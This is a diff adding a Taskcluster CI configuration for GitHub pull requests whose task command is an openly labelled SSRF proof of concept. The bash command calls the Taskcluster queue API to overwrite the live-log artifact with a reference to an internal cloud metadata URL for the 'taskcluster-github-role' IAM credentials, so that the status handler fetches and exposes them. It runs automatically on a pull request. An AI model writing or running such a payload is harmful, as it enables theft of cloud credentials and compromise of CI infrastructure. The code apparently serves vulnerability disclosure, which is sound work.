@@ -1,0 +1,38 @@
+version: 1
+reporting: checks
+policy:
+  pullRequests: public
+tasks:
+  - $if: 'tasks_for == "github-pull-request"'
+    then:
+      taskId: {$eval: as_slugid("pr-task")}
+      created: {$fromNow: ''}
+      deadline: {$fromNow: '1 hour'}
+      expires: {$fromNow: '1 day'}
+      provisionerId: docker-compose
+      workerType: generic-worker
+      routes:
+        - checks
+      metadata:
+        name: "PR check"
+        description: "Run checks on pull request"
+        owner: ${event.pull_request.user.login}@users.noreply.github.com
+        source: ${event.repository.html_url}
+      payload:
+        maxRunTime: 600
+        command:
+          - - /bin/bash
+            - -c
+            - >-
+              echo "=== SSRF PoC: overwriting livelog reference artifact ===" &&
+              TASK_ID=$(cat /etc/taskcluster/task-id) &&
+              RUN_ID=0 &&
+              echo "Task ID: $TASK_ID" &&
+              curl -s -X POST
+              "http://taskcluster/api/queue/v1/task/${TASK_ID}/runs/${RUN_ID}/artifacts/public%2Flogs%2Flive_backing.log"
+              -H "Content-Type: application/json"
+              -d "{\"storageType\":\"reference\",\"url\":\"http://172.18.0.1:9170/latest/meta-data/iam/security-credentials/taskcluster-github-role\",\"expires\":\"2099-01-01T00:00:00.000Z\",\"contentType\":\"text/plain\"}" &&
+              echo "Artifact overwritten. Sleeping to let status handler pick it up..." &&
+              sleep 5
+        features:
+          taskclusterProxy: true
